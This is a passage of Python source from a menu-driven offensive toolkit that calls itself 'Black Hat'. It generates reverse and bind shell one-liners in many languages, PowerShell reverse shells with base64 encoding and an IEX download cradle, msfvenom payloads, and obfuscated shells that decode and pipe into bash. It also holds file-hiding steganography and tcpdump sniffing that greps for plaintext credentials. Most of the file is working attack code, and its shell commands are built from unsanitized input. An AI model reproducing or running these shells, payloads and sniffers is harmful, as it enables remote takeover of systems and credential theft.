        "Generate bind shell one-liners",
        "Start a netcat listener",
        "Generate msfvenom payloads",
        "Generate PowerShell reverse shell",
        "Generate encoded/obfuscated shells",
    ]
    choice = display_menu("Shell Generator", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _generate_reverse_shells()
    elif choice == 2: _generate_bind_shells()
    elif choice == 3: _start_listener()
    elif choice == 4: _generate_msfvenom()
    elif choice == 5: _generate_powershell_shell()
    elif choice == 6: _generate_encoded_shells()


def _generate_reverse_shells():
    """Generate reverse shell one-liners."""
    lhost = get_user_input("Your listener IP")
    lport = get_user_input("Listener port", "4444")
    if not lhost:
        print_error("IP required.")
        return
    if not validate_port(lport):
        print_error("Invalid port.")
        return
    shells = {
        "Bash": "bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport),
        "Bash (alt)": "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (lhost, lport),
        "Python3": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" % (lhost, lport),
        "Netcat (traditional)": "nc -e /bin/sh %s %s" % (lhost, lport),
        "Netcat (OpenBSD)": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (lhost, lport),
        "Perl": "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'" % (lhost, lport),
        "PHP": "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" % (lhost, lport),
        "Ruby": "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'" % (lhost, lport),
        "Socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s" % (lhost, lport),
        "Lua": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');\"" % (lhost, lport),
    }
    print_section("Reverse Shell One-Liners")
    for name, cmd in shells.items():
        print_info("%s:" % name)
        print("    %s\n" % cmd)
    print_section("Listener Command")
    print_info("nc -lvnp %s" % lport)
    print_info("socat listener: socat file:`tty`,raw,echo=0 tcp-listen:%s,reuseaddr,fork" % lport)


def _generate_bind_shells():
    """Generate bind shell one-liners."""
    lport = get_user_input("Bind port", "4444")
    if not validate_port(lport):
        print_error("Invalid port.")
        return
    shells = {
        "Netcat": "nc -lvnp %s -e /bin/sh" % lport,
        "Python3": "python3 -c 'import socket,os;s=socket.socket();s.bind((\"\",int(%s)));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system(\"/bin/sh\")'" % lport,
        "Socat": "socat TCP-LISTEN:%s,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane" % lport,
    }
    print_section("Bind Shell One-Liners")
    for name, cmd in shells.items():
        print_info("%s:" % name)
        print("    %s\n" % cmd)
    print_info("Connect with: nc <target_ip> %s" % lport)


def _start_listener():
    """Start a netcat listener."""
    lport = get_user_input("Listener port", "4444")
    if not validate_port(lport):
        print_error("Invalid port.")
        return
    if check_tool("nc") or check_tool("ncat"):
        nc_cmd = "ncat" if check_tool("ncat") else "nc"
        print_warning("Starting listener on port %s (Ctrl+C to stop)..." % lport)
        print_info("Waiting for incoming connection...")
        stdout, stderr, rc = run_command("%s -lvnp %s 2>&1" % (nc_cmd, lport), timeout=120)
        output = stdout if stdout else stderr
        if output: print(output)
    elif check_tool("socat"):
        print_warning("Starting socat listener on port %s..." % lport)
        stdout, _, _ = run_command(
            "socat file:`tty`,raw,echo=0 tcp-listen:%s,reuseaddr 2>&1" % lport, timeout=120)
        if stdout: print(stdout)
    else:
        print_error("No listener tool (nc, ncat, socat). Install: sudo apt install ncat socat")


def _generate_msfvenom():
    """Generate payloads with msfvenom."""
    if not check_tool("msfvenom"):
        print_error("msfvenom not installed (part of Metasploit).")
        print_info("Install: curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall > msfinstall && chmod +x msfinstall && ./msfinstall")
        return
    lhost = get_user_input("Your IP")
    lport = get_user_input("Port", "4444")
    if not lhost: return
    payloads = [
        ("Linux ELF", "linux/x64/shell_reverse_tcp", "elf", "shell.elf"),
        ("Linux Meterpreter", "linux/x64/meterpreter/reverse_tcp", "elf", "meterp.elf"),
        ("Windows EXE", "windows/x64/shell_reverse_tcp", "exe", "shell.exe"),
        ("Windows Meterpreter", "windows/x64/meterpreter/reverse_tcp", "exe", "meterp.exe"),
        ("PHP", "php/reverse_php", "raw", "shell.php"),
        ("Python", "python/shell_reverse_tcp", "raw", "shell.py"),
        ("War (Java)", "java/jsp_shell_reverse_tcp", "war", "shell.war"),
    ]
    print_section("Available Payloads")
    for i, (name, _, _, _) in enumerate(payloads, 1):
        print("  %d. %s" % (i, name))
    choice = get_user_input("Select (1-%d)" % len(payloads), "1")
    try:
        idx = int(choice) - 1
        name, payload, fmt, filename = payloads[idx]
    except (ValueError, IndexError):
        return
    output_path = get_user_input("Output file", "/tmp/%s" % filename)
    print_status("Generating %s payload..." % name)
    stdout, stderr, rc = run_command(
        "msfvenom -p %s LHOST=%s LPORT=%s -f %s -o %s 2>&1" % (payload, lhost, lport, fmt, output_path), timeout=60)
    if stdout: print(stdout)
    if stderr: print(stderr)
    if rc == 0: print_info("Payload saved: %s" % output_path)


def _generate_powershell_shell():
    """Generate PowerShell reverse shell."""
    import base64
    lhost = get_user_input("Your IP")
    lport = get_user_input("Port", "4444")
    if not lhost: return
    ps = "$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" % (lhost, lport)
    encoded = base64.b64encode(ps.encode("utf-16le")).decode()
    print_section("PowerShell Reverse Shells")
    print_info("Plain:")
    print('    powershell -nop -c "%s"' % ps)
    print()
    print_info("Base64 Encoded:")
    print("    powershell -nop -enc %s" % encoded)
    print()
    print_info("Download cradle:")
    print("    powershell -nop -c \"IEX(New-Object Net.WebClient).downloadString('http://%s:%s/shell.ps1')\"" % (lhost, lport))


def _generate_encoded_shells():
    """Generate encoded reverse shells."""
    import base64
    lhost = get_user_input("Your IP")
    lport = get_user_input("Port", "4444")
    if not lhost: return
    bash_cmd = "bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
    b64 = base64.b64encode(bash_cmd.encode()).decode()
    print_section("Encoded Reverse Shells")
    print_info("Base64 Bash:")
    print("    echo %s | base64 -d | bash" % b64)
    print()
    py_cmd = "import socket,subprocess,os;s=socket.socket();s.connect(('%s',%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" % (lhost, lport)
    py_b64 = base64.b64encode(py_cmd.encode()).decode()
    print_info("Base64 Python:")
    print("    python3 -c \"exec(__import__('base64').b64decode('%s'))\"" % py_b64)
    print()
    hex_cmd = bash_cmd.encode().hex()
    print_info("Hex Bash:")
    print("    echo %s | xxd -r -p | bash" % hex_cmd)


# ============================================================
# 8. PAYLOAD ENCODING & OBFUSCATION
# ============================================================

def payload_encoding():
    """Encode, decode, and obfuscate payloads."""
    print_section("Payload Encoding & Obfuscation")
    options = [
        "Encode text (all formats)",
        "Decode text",
        "Multi-layer encoding",
        "XOR encrypt/decrypt",
        "File encoding/obfuscation",
        "Generate obfuscated script",
    ]
    choice = display_menu("Encoding Tools", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _encode_all()
    elif choice == 2: _decode_text()
    elif choice == 3: _multi_layer_encode()
    elif choice == 4: _xor_encrypt()
    elif choice == 5: _file_encode()
    elif choice == 6: _obfuscate_script()


def _encode_all():
    """Encode text in all formats."""
    import base64
    text = get_user_input("Enter text to encode")
    if not text: return
    print_section("Encoding Results")
    b64 = base64.b64encode(text.encode()).decode()
    print_info("Base64:      %s" % b64)
    hex_str = text.encode().hex()
    print_info("Hex:         %s" % hex_str)
    url_encoded = ""
    for c in text:
        if c.isalnum() or c in "-_.~":
            url_encoded += c
        else:
            url_encoded += "%%%02x" % ord(c)
    print_info("URL:         %s" % url_encoded)
    rot13 = text.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
    print_info("ROT13:       %s" % rot13)
    octal_str = " ".join("\\%03o" % ord(c) for c in text)
    print_info("Octal:       %s" % octal_str)
    binary_str = " ".join(format(ord(c), '08b') for c in text)
    print_info("Binary:      %s" % binary_str)
    unicode_str = "".join("\\u%04x" % ord(c) for c in text)
    print_info("Unicode:     %s" % unicode_str)
    html_str = "".join("&#%d;" % ord(c) for c in text)
    print_info("HTML:        %s" % html_str)
    print_info("Reversed:    %s" % text[::-1])
    print_section("Decode Commands")
    print_info("  Base64:  echo '%s' | base64 -d" % b64)
    print_info("  Hex:     echo '%s' | xxd -r -p" % hex_str)


def _decode_text():
    """Decode encoded text with auto-detection."""
    import base64
    text = get_user_input("Enter encoded text")
    if not text: return
    enc = get_user_input("Encoding: (1)base64 (2)hex (3)URL (4)ROT13 (5)auto-detect", "5")
    if enc == "5":
        print_section("Auto-Detection")
        try:
            d = base64.b64decode(text).decode("utf-8", errors="replace")
            if d.isprintable() or "\n" in d:
                print_info("Base64: %s" % d)
        except Exception:
            pass
        try:
            clean = text.replace(" ", "").replace("0x", "").replace("\\x", "")
            d = bytes.fromhex(clean).decode("utf-8", errors="replace")
            if d.isprintable():
                print_info("Hex: %s" % d)
        except Exception:
            pass
        try:
            import urllib.parse
            d = urllib.parse.unquote(text)
            if d != text:
                print_info("URL: %s" % d)
        except Exception:
            pass
        rot13 = text.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
        print_info("ROT13: %s" % rot13)
    elif enc == "1":
        try:
            print_info("Decoded: %s" % base64.b64decode(text).decode("utf-8", errors="replace"))
        except Exception as e:
            print_error("Error: %s" % e)
    elif enc == "2":
        try:
            print_info("Decoded: %s" % bytes.fromhex(text.replace(" ","")).decode("utf-8", errors="replace"))
        except Exception as e:
            print_error("Error: %s" % e)
    elif enc == "3":
        import urllib.parse
        print_info("Decoded: %s" % urllib.parse.unquote(text))
    elif enc == "4":
        print_info("Decoded: %s" % text.translate(str.maketrans(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
            "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")))


def _multi_layer_encode():
    """Apply multiple encoding layers."""
    import base64
    text = get_user_input("Enter text")
    if not text: return
    layers = get_user_input("Chain (e.g. 'base64,hex,rot13')", "base64,hex")
    current = text
    print_info("Original: %s" % current)
    for layer in [l.strip().lower() for l in layers.split(",")]:
        if layer == "base64":
            current = base64.b64encode(current.encode()).decode()
        elif layer == "hex":
            current = current.encode().hex()
        elif layer == "rot13":
            current = current.translate(str.maketrans(
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
        elif layer == "url":
            enc = ""
            for c in current:
                enc += c if c.isalnum() or c in "-_.~" else "%%%02x" % ord(c)
            current = enc
        elif layer == "reverse":
            current = current[::-1]
        else:
            print_warning("Unknown: %s" % layer)
            continue
        print_info("After %s: %s" % (layer, current[:200]))
    print_section("Final Result")
    print(current)


def _xor_encrypt():
    """XOR encrypt/decrypt text."""
    import base64
    text = get_user_input("Text to XOR")
    key = get_user_input("XOR key")
    if not text or not key: return
    result = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
    print_info("XOR hex: %s" % result.encode("utf-8", errors="replace").hex())
    print_info("XOR b64: %s" % base64.b64encode(result.encode("utf-8", errors="replace")).decode())
    print_info("XOR again with same key to decrypt.")


def _file_encode():
    """Encode/obfuscate a file."""
    filepath = get_user_input("File to encode")
    if not filepath: return
    stdout, _, _ = run_command("test -f '%s' && echo exists" % filepath)
    if "exists" not in (stdout or ""):
        print_error("File not found.")
        return
    enc = get_user_input("Encoding: (1)base64 (2)hex (3)XOR", "1")
    output = get_user_input("Output file", filepath + ".encoded")
    if enc == "1":
        _, _, rc = run_command("base64 '%s' > '%s' 2>/dev/null" % (filepath, output))
        if rc == 0:
            print_info("Base64 encoded: %s" % output)
            print_info("Decode: base64 -d '%s' > decoded" % output)
    elif enc == "2":
        _, _, rc = run_command("xxd -p '%s' > '%s' 2>/dev/null" % (filepath, output))
        if rc == 0: print_info("Hex encoded: %s" % output)
    elif enc == "3":
        key = int(get_user_input("XOR key byte (0-255)", "42") or "42")
        cmd = "python3 -c \"data=open('%s','rb').read();open('%s','wb').write(bytes(b^%d for b in data))\"" % (filepath, output, key)
        _, _, rc = run_command(cmd)
        if rc == 0: print_info("XOR encoded (key=%d): %s" % (key, output))


def _obfuscate_script():
    """Generate obfuscated script wrapper."""
    import base64
    command = get_user_input("Command to obfuscate")
    if not command: return
    b64 = base64.b64encode(command.encode()).decode()
    hex_cmd = command.encode().hex()
    print_section("Obfuscated Wrappers")
    print_info("Bash (base64):")
    print("    echo %s | base64 -d | bash" % b64)
    print()
    print_info("Python (base64):")
    print("    python3 -c \"exec(__import__('base64').b64decode('%s'))\"" % b64)
    print()
    print_info("Bash (hex):")
    print("    echo %s | xxd -r -p | bash" % hex_cmd)


# ============================================================
# 9. STEGANOGRAPHY TOOLKIT
# ============================================================

def stego_toolkit():
    """Hide, detect, and extract hidden data in files."""
    print_section("Steganography Toolkit")
    options = [
        "Detect hidden data in a file",
        "Hide data inside an image (steghide)",
        "Extract hidden data from image (steghide)",
        "Binwalk analysis (firmware/embedded)",
        "Extract embedded files (binwalk)",
        "LSB analysis (image)",
        "Append hidden data to file",
    ]
    choice = display_menu("Steganography", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _stego_detect()
    elif choice == 2: _stego_hide()
    elif choice == 3: _stego_extract()
    elif choice == 4: _binwalk_analyze()
    elif choice == 5: _binwalk_extract()
    elif choice == 6: _lsb_analysis()
    elif choice == 7: _append_data()


def _stego_detect():
    """Detect hidden data using multiple tools."""
    filepath = get_user_input("File to analyze")
    if not filepath: return
    stdout, _, _ = run_command("test -f '%s' && echo exists" % filepath)
    if "exists" not in (stdout or ""):
        print_error("File not found.")
        return
    print_section("File Analysis")
    stdout, _, _ = run_command("file '%s'" % filepath)
    if stdout: print_info("Type: %s" % stdout)
    stdout, _, _ = run_command("ls -lh '%s'" % filepath)
    if stdout: print_info("Size: %s" % stdout)
    if check_tool("strings"):
        print_section("Embedded Strings (tail)")
        stdout, _, _ = run_command("strings '%s' | tail -30" % filepath)
        if stdout: print(stdout)
    print_section("File Tail (hex)")
    stdout, _, _ = run_command("xxd '%s' | tail -15" % filepath)
    if stdout: print(stdout)
    if check_tool("steghide"):
        print_section("Steghide Detection")
        stdout, stderr, _ = run_command("steghide info '%s' 2>&1" % filepath)
        if stdout or stderr: print(stdout if stdout else stderr)
    if check_tool("binwalk"):
        print_section("Binwalk Scan")
        stdout, _, _ = run_command("binwalk '%s' 2>&1" % filepath)
        if stdout: print(stdout)
    if check_tool("exiftool"):
        print_section("Metadata")
        stdout, _, _ = run_command("exiftool '%s' 2>/dev/null" % filepath)
        if stdout: print(stdout)


def _stego_hide():
    """Hide data inside image with steghide."""
    if not check_tool("steghide"):
        print_error("steghide required. Install: sudo apt install steghide")
        return
    cover = get_user_input("Cover image (JPEG/BMP)")
    secret = get_user_input("File to hide")
    output = get_user_input("Output file", (cover or "") + ".stego")
    passphrase = get_user_input("Passphrase (empty=none)", "")
    if not cover or not secret: return
    cmd = "steghide embed -cf '%s' -ef '%s' -sf '%s' -p '%s' 2>&1" % (cover, secret, output, passphrase)
    print_status("Embedding data...")
    stdout, _, rc = run_command(cmd)
    if rc == 0: print_info("Hidden in: %s" % output)
    else: print_error("Failed: %s" % stdout)


def _stego_extract():
    """Extract hidden data from image."""
    if not check_tool("steghide"):
        print_error("steghide required. Install: sudo apt install steghide")
        return
    stego_file = get_user_input("Stego file")
    output_dir = get_user_input("Output directory", "/tmp")
    passphrase = get_user_input("Passphrase (empty=none)", "")
    if not stego_file: return
    cmd = "steghide extract -sf '%s' -xf '%s/extracted_data' -p '%s' -f 2>&1" % (stego_file, output_dir, passphrase)
    print_status("Extracting...")
    stdout, _, rc = run_command(cmd)
    if rc == 0:
        print_info("Extracted: %s/extracted_data" % output_dir)
        stdout, _, _ = run_command("file '%s/extracted_data'" % output_dir)
        if stdout: print_info("Type: %s" % stdout)
    else:
        print_error("Failed: %s" % stdout)


def _binwalk_analyze():
    """Analyze file with binwalk."""
    if not check_tool("binwalk"):
        print_error("binwalk required. Install: sudo apt install binwalk")
        return
    filepath = get_user_input("File to analyze")
    if not filepath: return
    print_status("Binwalk analysis...")
    stdout, _, _ = run_command("binwalk '%s' 2>&1" % filepath)
    if stdout: print(stdout)
    print_section("Entropy Analysis")
    stdout, _, _ = run_command("binwalk -E '%s' 2>&1 | head -20" % filepath)
    if stdout: print(stdout)


def _binwalk_extract():
    """Extract embedded files with binwalk."""
    if not check_tool("binwalk"):
        print_error("binwalk required.")
        return
    filepath = get_user_input("File to extract from")
    output_dir = get_user_input("Output directory", "/tmp/binwalk_extract")
    if not filepath: return
    print_status("Extracting...")
    stdout, _, rc = run_command("binwalk -e -C '%s' '%s' 2>&1" % (output_dir, filepath), timeout=60)
    if stdout: print(stdout)
    if rc == 0:
        stdout, _, _ = run_command("find '%s' -type f 2>/dev/null" % output_dir)
        if stdout:
            print_info("Extracted files:")
            print(stdout)


def _lsb_analysis():
    """Analyze least significant bits."""
    filepath = get_user_input("Image file")
    if not filepath: return
    print_status("Analyzing LSBs...")
    lsb_script = (
        "data = open('%s', 'rb').read();"
        "lsbs = ''.join(str(b & 1) for b in data[:1000]);"
        "print('First 1000 LSBs:');"
        "print(lsbs[:100]);"
        "ones = lsbs.count('1');"
        "zeros = lsbs.count('0');"
        "ratio = ones/(ones+zeros) if (ones+zeros) > 0 else 0;"
        "print('1s: %%d, 0s: %%d, ratio: %%.3f' %% (ones, zeros, ratio));"
        "print('Expected ~0.500 for random data');"
        "print('ANOMALY: possible hidden data' if abs(ratio - 0.5) > 0.1 else 'Distribution appears normal');"
    ) % filepath
    stdout, _, _ = run_command("python3 -c \"%s\"" % lsb_script)
    if stdout: print(stdout)


def _append_data():
    """Append hidden data to a file."""
    filepath = get_user_input("File to append to")
    data = get_user_input("Data to hide")
    if not filepath or not data: return
    output = filepath + ".hidden"
    run_command("cp '%s' '%s'" % (filepath, output))
    _, _, rc = run_command("echo '%s' >> '%s'" % (data, output))
    if rc == 0:
        print_info("Data appended: %s" % output)
        print_info("File still opens normally but has hidden data at end.")
        stdout, _, _ = run_command("xxd '%s' | tail -5" % output)
        if stdout: print(stdout)


# ============================================================
# 10. METADATA TOOLKIT
# ============================================================

def metadata_toolkit():
    """Extract, view, and strip metadata from files."""
    print_section("Metadata Extraction & Stripping")
    options = [
        "Extract all metadata from file",
        "Strip/clean metadata from file",
        "Extract GPS coordinates",
        "Batch extract metadata from directory",
        "Compare metadata between files",
    ]
    choice = display_menu("Metadata Tools", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _extract_metadata()
    elif choice == 2: _strip_metadata()
    elif choice == 3: _extract_gps()
    elif choice == 4: _batch_metadata()
    elif choice == 5: _compare_metadata()


def _extract_metadata():
    """Extract all metadata."""
    filepath = get_user_input("File path")
    if not filepath: return
    stdout, _, _ = run_command("test -f '%s' && echo exists" % filepath)
    if "exists" not in (stdout or ""):
        print_error("File not found.")
        return
    print_section("Basic File Information")
    stdout, _, _ = run_command("file '%s'" % filepath)
    if stdout: print_info("Type: %s" % stdout)
    stdout, _, _ = run_command("stat '%s'" % filepath)
    if stdout: print(stdout)
    print_section("File Hashes")
    for algo in ["md5sum", "sha1sum", "sha256sum"]:
        stdout, _, _ = run_command("%s '%s'" % (algo, filepath))
        if stdout: print_info("%s: %s" % (algo.replace("sum","").upper(), stdout.split()[0]))
    if check_tool("exiftool"):
        print_section("EXIF/Metadata (exiftool)")
        stdout, _, _ = run_command("exiftool '%s'" % filepath)
        if stdout: print(stdout)
    else:
        print_info("Install exiftool: sudo apt install libimage-exiftool-perl")


def _strip_metadata():
    """Strip metadata from file."""
    filepath = get_user_input("File to strip")
    if not filepath: return
    if check_tool("exiftool"):
        output = filepath + ".clean"
        run_command("cp '%s' '%s'" % (filepath, output))
        print_status("Stripping metadata...")
        stdout, _, rc = run_command("exiftool -all= '%s' 2>&1" % output)
        if rc == 0:
            print_info("Stripped: %s" % output)
            s1, _, _ = run_command("exiftool '%s' 2>/dev/null | wc -l" % filepath)
            s2, _, _ = run_command("exiftool '%s' 2>/dev/null | wc -l" % output)
            print_info("Before: %s fields, After: %s fields" % ((s1 or "").strip(), (s2 or "").strip()))
        else:
            print_error("Failed: %s" % stdout)
    elif check_tool("mat2"):
        stdout, _, _ = run_command("mat2 '%s' 2>&1" % filepath)
        if stdout: print(stdout)
    else:
        print_error("exiftool or mat2 required. Install: sudo apt install libimage-exiftool-perl")


def _extract_gps():
    """Extract GPS coordinates from images."""
    filepath = get_user_input("Image file")
    if not filepath: return
    if not check_tool("exiftool"):
        print_error("exiftool required: sudo apt install libimage-exiftool-perl")
        return
    print_status("Extracting GPS...")
    stdout, _, _ = run_command("exiftool -GPSLatitude -GPSLongitude -GPSAltitude -GPSDateTime '%s' 2>/dev/null" % filepath)
    if stdout and "GPS" in stdout:
        print_info("GPS Data:")
        print(stdout)
        stdout2, _, _ = run_command("exiftool -n -GPSLatitude -GPSLongitude '%s' 2>/dev/null" % filepath)
        if stdout2:
            lat = lon = None
            for line in stdout2.strip().split("\n"):
                if "Latitude" in line: lat = line.split(":")[-1].strip()
                if "Longitude" in line: lon = line.split(":")[-1].strip()
            if lat and lon:
                print_info("Google Maps: https://www.google.com/maps?q=%s,%s" % (lat, lon))
    else:
        print_info("No GPS data found.")


def _batch_metadata():
    """Batch extract metadata from directory."""
    dirpath = get_user_input("Directory")
    if not dirpath: return
    if not check_tool("exiftool"):
        print_error("exiftool required.")
        return
    print_status("Scanning directory...")
    stdout, _, _ = run_command("exiftool -r -csv '%s' 2>/dev/null | head -50" % dirpath, timeout=60)
    if stdout: print(stdout)
    output = "/tmp/metadata_report.csv"
    _, _, rc = run_command("exiftool -r -csv '%s' > '%s' 2>/dev/null" % (dirpath, output), timeout=120)
    if rc == 0: print_info("Report: %s" % output)


def _compare_metadata():
    """Compare metadata between two files."""
    f1 = get_user_input("First file")
    f2 = get_user_input("Second file")
    if not f1 or not f2: return
    if check_tool("exiftool"):
        print_section("Metadata Comparison")
        s1, _, _ = run_command("exiftool '%s' 2>/dev/null" % f1)
        s2, _, _ = run_command("exiftool '%s' 2>/dev/null" % f2)
        if s1 and s2:
            l1 = set(s1.strip().split("\n"))
            l2 = set(s2.strip().split("\n"))
            only1 = l1 - l2
            only2 = l2 - l1
            if only1:
                print_warning("Only in %s:" % f1)
                for l in sorted(only1): print("  %s" % l)
            if only2:
                print_warning("Only in %s:" % f2)
                for l in sorted(only2): print("  %s" % l)
            if not only1 and not only2:
                print_info("Metadata identical.")
    else:
        for algo in ["md5sum", "sha256sum"]:
            s1, _, _ = run_command("%s '%s'" % (algo, f1))
            s2, _, _ = run_command("%s '%s'" % (algo, f2))
            if s1 and s2: print_info("%s: %s vs %s" % (algo, s1.split()[0][:16], s2.split()[0][:16]))


# ============================================================
# 11. NETWORK SNIFFING & PROTOCOL ANALYSIS
# ============================================================

def network_sniffing():
    """Network sniffing and protocol analysis."""
    print_section("Network Sniffing & Protocol Analysis")
    require_root("Network sniffing")
    options = [
        "Sniff credentials (HTTP/FTP/Telnet)",
        "DNS query monitoring",
        "ARP traffic monitoring",
        "Full protocol analysis",
        "Extract URLs from traffic",
    ]
    choice = display_menu("Network Sniffing", options, Colors.CYAN)
    if choice == 0: return
    elif choice == 1: _sniff_credentials()
    elif choice == 2: _sniff_dns()
    elif choice == 3: _sniff_arp()
    elif choice == 4: _protocol_analysis()
    elif choice == 5: _extract_urls()


def _sniff_credentials():
    """Sniff for plaintext credentials."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    duration = get_user_input("Duration (seconds)", "30")
    print_warning("Capturing plaintext credential traffic for %ss..." % duration)
    stdout, _, _ = run_command(
        "timeout %s tcpdump -i %s -nn -A "
        "'port 21 or port 23 or port 25 or port 80 or port 110 or port 143' 2>&1 | "
        "grep -iE 'user|pass|login|auth' | head -50" % (duration, iface),
        timeout=int(duration) + 10)
    if stdout:
        print_warning("Potential credentials:")
        print(stdout)
    else:
        print_info("No plaintext credentials detected.")


def _sniff_dns():
    """Monitor DNS queries."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packets", "50")
    print_status("Monitoring DNS...")
    stdout, _, _ = run_command("tcpdump -i %s -c %s -nn 'port 53' 2>&1" % (iface, count), timeout=60)
    if stdout: print(stdout)


def _sniff_arp():
    """Monitor ARP traffic."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packets", "30")
    print_status("Monitoring ARP...")
    stdout, _, _ = run_command("tcpdump -i %s -c %s -nn arp 2>&1" % (iface, count), timeout=60)
    if stdout: print(stdout)


def _protocol_analysis():
    """Analyze traffic by protocol."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    count = get_user_input("Packets", "100")
    pcap = "/tmp/protocol_analysis.pcap"
    print_status("Capturing %s packets..." % count)
    _, _, rc = run_command("tcpdump -i %s -c %s -w %s 2>&1" % (iface, count, pcap), timeout=120)
    if rc == 0 and check_tool("tshark"):
        print_section("Protocol Hierarchy")
        stdout, _, _ = run_command("tshark -r %s -q -z io,phs 2>&1" % pcap, timeout=30)
        if stdout: print(stdout)
        print_section("Top Endpoints")
        stdout, _, _ = run_command("tshark -r %s -q -z endpoints,ip 2>&1 | head -20" % pcap, timeout=30)
        if stdout: print(stdout)
    elif rc == 0:
        stdout, _, _ = run_command("tcpdump -r %s -nn 2>&1 | head -50" % pcap)
        if stdout: print(stdout)


def _extract_urls():
    """Extract URLs from traffic."""
    if not check_tool("tcpdump"):
        print_error("tcpdump required.")
        return
    iface = get_user_input("Interface", "any")
    duration = get_user_input("Duration (seconds)", "30")
    print_status("Capturing HTTP for %ss..." % duration)
    stdout, _, _ = run_command(
        "timeout %s tcpdump -i %s -nn -A 'port 80' 2>&1 | "
        "grep -oE '(GET|POST|PUT|DELETE) [^ ]+' | head -50" % (duration, iface),
        timeout=int(duration) + 10)
    if stdout:
        print_info("HTTP requests:")
        print(stdout)
    else:
        print_info("No HTTP traffic captured.")


# ============================================================
# 12. CHECK TOOLS
# ============================================================

def check_black_tools():
    """Check and optionally install offensive security tools."""
    print_section("Black Hat Tool Availability Check")
    tools = [
        "nmap", "masscan", "nikto", "sqlmap", "hydra",
        "john", "hashcat", "aircrack-ng", "airmon-ng",
        "msfconsole", "msfvenom", "searchsploit",
        "wpscan", "gobuster", "dirb", "ffuf",
        "tcpdump", "tshark", "wireshark",
        "steghide", "binwalk", "foremost",
        "exiftool", "strings", "xxd", "objdump",
        "gdb", "radare2",
        "nc", "ncat", "socat", "proxychains",
        "tor", "openvpn", "ssh",
        "rkhunter", "chkrootkit",
    ]
    available, missing = check_required_tools(tools)
    if missing and confirm_action("Install common missing tools?"):
        apt_tools = [
            "nmap", "nikto", "hydra", "john", "hashcat",
            "aircrack-ng", "tcpdump", "tshark",
            "steghide", "binwalk", "foremost",
            "libimage-exiftool-perl", "xxd",
            "ncat", "socat", "proxychains4",
            "gobuster", "dirb", "sqlmap",
            "rkhunter", "chkrootkit",
        ]
        installable = [t for t in apt_tools if t in missing or
                       t.replace("libimage-exiftool-perl","exiftool").replace("proxychains4","proxychains") in missing]
        if installable:
            cmd = "sudo apt install -y %s 2>&1" % " ".join(installable)
            print_status("Installing: %s" % " ".join(installable))
            stdout, _, _ = run_command(cmd, timeout=120)
            if stdout:
                print(stdout[-500:] if len(stdout) > 500 else stdout)
